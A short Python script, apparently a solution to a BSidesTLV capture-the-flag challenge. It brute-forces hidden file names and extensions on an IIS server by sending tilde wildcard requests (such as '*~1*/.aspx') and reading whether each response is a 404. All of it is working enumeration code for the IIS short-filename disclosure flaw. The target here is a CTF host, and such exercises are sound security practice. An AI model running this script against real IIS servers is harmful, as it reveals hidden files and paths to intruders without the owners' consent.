import requests
import string
import time
import mimetypes

def find_chars():
    try_chars = ''
    all_chars = string.printable
    for char in all_chars:
        if char not in string.ascii_lowercase.upper() and char not in '#$%&()*+,-.\/:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c':
        #if char not in '#?*%.l':
            try_chars += char
    filenames = ['l3v3lup']
    #filename = 'l3v3lupah1dd3n'
    old_len = 0
    bad_letters = ''
    while True:
        for i in range(len(filenames)):
            start_length = len(filenames[i])
            for char in try_chars:
                if char not in bad_letters:
                    print('\n-------------------')
                    print('Filenames: ', filenames)
                    print('Current filename: ', filenames[i])
                    print('Trying char: ', char)
                    while True:
                        try:
                            r = requests.get('http://iis.challenges.bsidestlv.com/' + filenames[i] + char + '*~1*/.aspx')
                            if r is not None:
                                break
                            else:
                                time.sleep(.3)
                        except Exception:
                            pass
                    print(r.text)
                    print(r)
                    print('-------------------')
                    if r.status_code == 404:
                        bad_letters += char
                        filenames.insert(i+1, filenames[i])
                        filenames[i] += char
                        break
            if start_length == len(filenames[i]):
                del filenames[i]
        bad_letters = ''
    print('\nFilenames: ' + filenames)

def try_extensions(exts, exit_on_find=False):
    filename = 'l3v3lupah1dd3n/'
    while True:
        for ext in exts:
            print('\n-------------------')
            print('Trying ext: ', ext)
            while True:
                try:
                    r = requests.get('http://iis.challenges.bsidestlv.com/' + filename + ext)
                    print('http://iis.challenges.bsidestlv.com/' + filename + ext)# + '~1/.aspx')
                    if r is not None:
                        break
                    else:
                        time.sleep(.3)
                except Exception:
                    pass
            print(r.text)
            print(r)
            if r.status_code != 400:
                print('\nRESULT\nRESULT\nRESULT\nRESULT\n')
                if exit_on_find:
                    break
            print('-------------------')
        filename = filename[:-1]

def main():
    find_chars()
    #try_extensions()
    #try_extensions(mimetypes.types_map, True)
    #try_extensions(['~1/.aspx', '~1.%3F/.aspx', '~1.%3F%3F/.aspx', '~1.%3F%3F%3F/.aspx'])

if __name__ == '__main__':
    main()